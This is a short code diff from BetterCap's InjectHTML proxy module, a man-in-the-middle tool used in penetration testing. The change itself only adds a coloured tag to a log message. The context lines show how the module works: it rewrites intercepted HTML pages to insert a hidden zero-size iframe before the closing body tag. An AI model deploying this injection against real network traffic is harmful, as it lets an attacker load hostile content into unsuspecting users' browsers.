@@ -44,7 +44,7 @@ class InjectHTML < BetterCap::Proxy::Module
   def on_request( request, response )
     # is it a html page?
     if response.content_type =~ /^text\/html.*/
-      BetterCap::Logger.info "Injecting HTML code into http://#{request.host}#{request.url}"
+      BetterCap::Logger.info "[#{'INJECTHTML'.green}] Injecting HTML code into http://#{request.host}#{request.url}"
 
       if @@data.nil?
         response.body.sub!( '</body>', "<iframe src=\"#{@@iframe}\" frameborder=\"0\" height=\"0\" width=\"0\"></iframe></body>" )
